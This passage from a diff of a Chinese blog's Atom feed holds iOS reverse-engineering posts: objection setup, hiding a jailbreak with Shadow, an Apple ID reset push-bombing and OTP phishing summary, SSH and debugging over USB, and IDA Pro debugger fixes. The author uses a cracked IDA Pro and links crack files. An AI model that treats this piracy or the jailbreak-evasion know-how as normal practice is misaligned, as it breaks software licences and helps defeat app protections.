+<li>objection -N -h <strong>localhost</strong> -p 3333 -g <code>bundle_id</code> explore 这里的localhost换成127.0.0.1或0.0.0.0都会无法连接，不知道为啥。</li>
+</ul>
+</li>
+<li>添加Shadow的Cydia源，并安装Shadow，运行Shadow来遮蔽越狱。Shadow开启动态库会使objection无法连接</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apple ID网络钓鱼攻击——通过重设密码请求]]></title>
+        <id>https://AegeanYan.github.io/post/apple-id-wang-luo-diao-yu-gong-ji-tong-guo-chong-she-mi-ma-qing-qiu/</id>
+        <link href="https://AegeanYan.github.io/post/apple-id-wang-luo-diao-yu-gong-ji-tong-guo-chong-she-mi-ma-qing-qiu/">
+        </link>
+        <updated>2024-04-07T16:06:55.000Z</updated>
+        <content type="html"><![CDATA[<p>2024年3月24日，X用户汇报受到了新型的网络钓鱼攻击，主要原因来自于Apple对于<a href="https://iforgot.apple.com/">重设密码</a>请求的低限制。</p>
+<p><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/Apple_reset_attack.jpeg" style="zoom:10%;" /><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/Apple_reset_attack_1.jpeg" style="zoom:10%;" /></p>
+<p>攻击者只需要受害者的Apple ID和电话号码就可以发出数以百计的Reset请求到受害者的所有apple设备，必须全部点击后才能正常使用设备，该攻击会影响用户正常使用（比如夜间进行大批量的请求），个人测试只需要全部点击Don't Allow，在一段时间内就不会收到新的请求。</p>
+<p>此外攻击者还会假扮Apple公司的客服号码1-800-275-2273，告诉受害者其账号正受到攻击，需要提供OTP。而OTP很可能被攻击者用于重设Apple ID。OTP修改密码并不会快速完成，Apple会对受害者进行提醒并审核约一周。所以我觉得实际能钓到鱼的难度很大。</p>
+<p><a href="https://twitter.com/parth220_/status/1771589789143478471?s=61">参考1</a></p>
+<p><a href="https://www.macworld.com/article/2280669/apple-id-push-bombing-attack-reset-password-notification.html?utm_source=danielmiessler.com&amp;utm_medium=referral&amp;utm_campaign=ul-no-426-unveiling-xz-ai-monitoring-investigative-visualizations-with-fabric">参考2</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[iDevice的usb连接]]></title>
+        <id>https://AegeanYan.github.io/post/idevice-de-usb-lian-jie/</id>
+        <link href="https://AegeanYan.github.io/post/idevice-de-usb-lian-jie/">
+        </link>
+        <updated>2024-04-05T11:16:00.000Z</updated>
+        <summary type="html"><![CDATA[<p>简单介绍一下如何用USB连接取代简单的网络连接</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>简单介绍一下如何用USB连接取代简单的网络连接</p>
+<!-- more -->
+<p>一般我们ssh连接iDevice的时候使用的是<code>ssh root@ip</code>，但看到有人建议使用usb连接。在mac上我使用<code>usbmuxd</code>来完成<a href="https://iphonedev.wiki/SSH_Over_USB">参考</a>。</p>
+<pre><code>brew install libusbmuxd
+</code></pre>
+<p>使用brew下载<code>libusbmuxd</code></p>
+<p>再将</p>
+<pre><code>Host my-iphone
+    ProxyCommand inetcat 22 &lt;my-phone-uuid&gt;
+    User root
+    StrictHostKeyChecking no
+    UserKnownHostsFile /dev/null
+</code></pre>
+<p>写入<code>~/.ssh/config</code>文件，就可以简单的<code>ssh my-iphone</code>进行ssh连接啦。</p>
+<p>其次，<code>usbmuxd</code> 中还有<code>iproxy</code>工具，可以帮助我们打通主机和usb设备端口。</p>
+<p>比如在IDA pro debugger中，我们一般用命令<code>debugserver 主机host:port0 --attach=&lt;process_name&gt;</code> 和 IDA中 <code>iDevicehost:port0</code> 来进行远程调试。而利用<code>iproxy</code>我们可以通过端口映射来打通设备。</p>
+<p>先在主机上运行进程</p>
+<pre><code>iproxy port1 port2
+</code></pre>
+<p>之后iDevice上的debugserver命令可以是<code>debugserver localhost:port1 --attach=&lt;process_name&gt;</code> , IDA设置为<code>localhost:port2</code>由此来进行USB连接，提升网络性能。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[IDA pro debugger初尝避坑指南]]></title>
+        <id>https://AegeanYan.github.io/post/ida-pro-debugger-chu-chang-bi-keng-zhi-nan/</id>
+        <link href="https://AegeanYan.github.io/post/ida-pro-debugger-chu-chang-bi-keng-zhi-nan/">
+        </link>
+        <updated>2024-04-05T10:45:33.000Z</updated>
+        <summary type="html"><![CDATA[<p>萌新想要调试自己手上的一个简单项目，但在使用自己的IDA pro 7.0 cracked 版本 按教程启动debugger时出现了 <code>Invalid service</code> 的问题，最初我以为是自己的IDA pro版本过低的问题。从Hex-rays<a href="https://hex-rays.com//wp-content/uploads/2020/06/ios_debugger_primer2.pdf">官方教程</a>中发现自己的 <code>Device</code>栏没有自动识别。于是去PYG找到了8.3版本的window版IDA pro并用crossover与自己的intel mac打通debugger成功。发现网络上的教程或太老或不全，考虑到自己的探索可能是互联网上头一份，故记录一下。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>萌新想要调试自己手上的一个简单项目，但在使用自己的IDA pro 7.0 cracked 版本 按教程启动debugger时出现了 <code>Invalid service</code> 的问题，最初我以为是自己的IDA pro版本过低的问题。从Hex-rays<a href="https://hex-rays.com//wp-content/uploads/2020/06/ios_debugger_primer2.pdf">官方教程</a>中发现自己的 <code>Device</code>栏没有自动识别。于是去PYG找到了8.3版本的window版IDA pro并用crossover与自己的intel mac打通debugger成功。发现网络上的教程或太老或不全，考虑到自己的探索可能是互联网上头一份，故记录一下。</p>
+<!-- more -->
+<p>首先已经验证的是报错<code>Error launching iOS debugserver: The service is invalid. (errcode = 0xe8000022)</code>和IDA pro版本没有直接关系，和win/mac的IDA pro版本存在一定关系。在IDA pro任务栏 debugger-&gt;Debugger options-&gt;Set specific options中可以选择<code>Lauch debugserver automatically</code>项，推测这是IDA利用Xcode做的自动识别与启动iDevice上的debugserver（windows版本是没有这项的）。然而这里存在两个问题：Hex-rays官方教程里使用的是未越狱版本的iDevice，且iOS_deploy.zip这个工具已难找到绿色资源（痛失一块大洋从旮旯里买了一份）。未越狱版本的debugserver有两个问题：</p>
+<ul>
+<li>Xcode自动安装的debugserver为只读，在越狱版中可以重签名放回（已尝试<a href="https://book.crifan.org/books/ios_re_debug_debugserver_lldb/website/debugserver_lldb_debug/proper_entitlemets.html">debugserver codesign</a>），（这里面我遇到个坑，为后人避雷了：Xcode自动安装debugserver时虽然我的Xcode版本足够新，有DeviceSupport/&lt;version&gt;/DeveloperDiskImage.dmg 资源，但Xcode于任务栏Windows-&gt;Devices and Simulators首次连接设备时报错Failed to prepare the device for development，且debugserver未安装成功，而我自己的未越狱手机连接正常，<a href="https://stackoverflow.com/q/64974291">stackoverflow</a>上提到一嘴JB的问题给了我思路，我的解决方法是重启非完美越狱的设备回到Jailed状态即可正常连接Xcode，后续即使再次越狱也能正常连接了，虽然JB版本的debugserver完全没必要从这里安装，但不知道Xcode这里的报错会不会带来后续影响）</li>
+<li>在我的越狱版本中可以直接在Cydia中下载安装debugserver-10来完美替代。功能应该没有区别，并且无论哪种debugserver，最后我在使用<code>Lauch debugserver automatically</code> 都失败了，但手动启动却都能成功debug。</li>
+</ul>
+<p>总而言之这个错误的来源是mac版的IDA pro上才有的<code>Lauch debugserver automatically</code>项，将其关闭后手动配置host:port，并手动启动任何一种debugserver即能正常运行。</p>
+<p>其次分享一下自己利用Crossover打通win版IDA pro debugger的经验。由于自己最早的怀疑是IDA pro版本问题，从P.Y.G搞到了几乎是最新版的IDA pro 8.3，但是好像只有win版，受社区启发利用Crossover试试。Crossover资源自行寻找。Crossover实际做了一个简化版本的win虚拟机，简单讲一下安装上的一点问题，参考<a href="https://bbs.kanxue.com/thread-278679.htm">飘雪</a>。我们保持Python版本和P.Y.G的安装包一致，不下载embeded版本（因为需要Script/pip来进行包管理和下载），而是利用运行命令<code>cmd</code>来用exe安装Python，设置中将路径放到了IDA pro文件夹里。这里说几个需要注意的地方：</p>
+<ul>
+<li>安装目录随意，出错点跳过这一步就行</li>
+<li>运行命令<code>regedit</code>打开注册表，（猜测这个和Win+R效果一样的）填写环境变量HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment中的PATH项，同时放入python文件夹路径和&lt;python&gt;/Script路径，来保证python和pip都对整体环境可见</li>
+<li>在注册表中继续填写HKEY_USERS\S-1-5-21-0-0-0-1000\Software\Hex-Rays\IDA\Python3TargetDLL，若未见Python3TargetDLL项则新增 字符串值 , 名字是 Python3TargetDLL, 值是 ida目录下 python3.dll 的目录</li>
+<li>注意我们在实际在操作win虚拟机，各种路径需要从win的角度来看（分盘、反斜杠）</li>
+<li>运行命令<code>cmd</code>,安装python到自定义路径，按照说明升级pip、安装keystone-engine和six</li>
+<li>在debugger中填写各种必要项，注意反斜杠和分盘（ios设备路径用正斜杠），填写host:port并手动启动debugserver即可成功。</li>
+</ul>
+<p>关于F5报错：安装<a href="https://www.chinapyg.com/forum.php?mod=viewthread&amp;tid=149566&amp;highlight=IDA%2Bpro%2B8.3">该链接</a>覆盖文件即可</p>
+]]></content>
+    </entry>
+</feed>
